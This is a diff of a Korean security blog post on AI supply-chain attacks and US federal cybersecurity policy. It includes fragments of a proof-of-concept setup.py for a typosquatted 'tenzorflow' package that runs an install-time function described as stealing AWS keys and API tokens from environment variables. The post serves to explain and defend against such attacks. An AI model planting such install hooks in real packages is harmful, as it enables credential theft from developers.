@@ -32,8 +32,7 @@ categories:
 
 아래 다이어그램은 정부의 AI 도입 가속화에 따라 발생할 수 있는 AI 공급망 공격의 흐름을 시각화한 것입니다.
 
-````mermaid`
-
+```mermaid
 graph LR
     A[공급망 공격자] -->|악성 코드 삽입| B(오픈소스 ML 라이브러리)
     B --> C[연방 기관 개발 환경]
@@ -41,8 +40,7 @@ graph LR
     D -->|데이터 독| E[공격자 C2 서버]
     F[내부 사용자] -->|악성 프롬프트| D
     D -->|모델 무결성 훼손| F
-
-`````
+```
 
 ## 실제 공격 예시 (Attack Example)
 
@@ -50,8 +48,7 @@ graph LR
 
 이 악성 패키지는 정상적인 기능을 수행하면서도, 백그라운드에서 사용자의 환경 변수(OS 환경 변수)를 스캔하여 AWS 키나 API 토큰을 탈취하는 코드를 포함하고 있습니다. 다음은 해당 악성 패키지의 `setup.py`에 포함될 수 있는 간단한 PoC(개념 증명) 코드입니다.
 
-````python`
-
+```python
 import os
 import requests
 import base64
@@ -76,7 +73,6 @@ def exfiltrate_data():
             pass # 실패 시 묵묵히 무시하여 탐지 회피
 
 # 설치 시 악성 함수 실행
-
 exfiltrate_data()
 
 setup(
@@ -84,8 +80,7 @@ setup(
     version='2.15.0',
     packages=['tenzorflow'],
 )
-
-`````
+```
 
 이처럼 보안 감사가 생략된 채 급하게 도입된 라이브러리들은 "Shadow IT"의 형태로 퍼져나가, 결국 방화벽 내부에서 데이터 유출 사고를 일으키는 파괴적인 경로가 됩니다.
 
@@ -97,4 +92,18 @@ setup(
 
 둘째, **제로 트러스트(Zero Trust) 아키텍처의 실질적 구현**입니다. 단순히 네트워크 경계만 방어하는 것이 아니라, 모든 API 요청과 클라우드 접속 시도에 대해 엄격한 인증과 권한 확인을 수행해야 합니다. 특히 AI 모델 서버에 접근하는 계정에는 최소 권한 원칙(Least Privilege)을 적용해야 합니다.
 
-셋째, **AI 보
+셋째, **AI 보안 검증 프레임워크의 도입**입니다. 모델 훈련 데이터에 대한 포이즈닝(Poisoning) 공격 방지와 적대적 샘플(Adversarial Examples)에 대한 내성을 테스트하는 레드 팀 운영이 필수적입니다.
+
+## 보안 시사점 (Security Implications)
+
+트럼프 행정부의 보안 정책 변화는 "정부의 개입을 줄이고 효율성을 높인다"는 기조를 보이고 있지만, 이는 사이버 보안의 책임을 민간 기관과 개별 기업으로 더욱 전가한다는 의미이기도 합니다. 규제 완화가 곧 보안 완화를 의미하지는 않습니다. 오히려 기업들은 자체적인 위협 모델링과 공격 시뮬레이션을 통해 보안 태세를 강화해야 합니다.
+
+향후 5년 내 AI와 자동화를 활용한 사이버 공격은 더욱 정교해질 것입니다. 정부의 정책 변화에 맹목적으로 의존하기보다, 보안의 본질인 '가용성, 무결성, 기밀성'을 지키기 위해 실질적인 기술적 투자와 거버넌스 강화가 시급합니다.
+
+## 참고자료
+
+- [Trump administration cybersecurity priorities - Federal News Network](https://news.google.com/rss/articles/CBMiqwFBVV95cUxNNjlzT2k3Qy1VNTJsRGNTbnR3NVpEQVAzWXR4eENSR3BEVXUxZHdyU0tVZEJXd19MMi1TOHpvS1RHdndsRlhwa2dtbGNjTmZHcms4WWFOaTh1aXVEOUVjR2Z6R2FpVjNtVEJJUDZEMkdGeFlGbnZRdkx6Nl95THc0SGhlbzFtZ2lEbTVISXI3TTIyNGVQZlhhLUtmSGtScjJ4d3cyNmludFRKdFk?oc=5)
+- [CISA (Cybersecurity and Infrastructure Security Agency) Guidelines](https://www.cisa.gov/)
+- [OWASP Supply Chain Security](https://owasp.org/www-project-supply-chain-security/)
+
+---
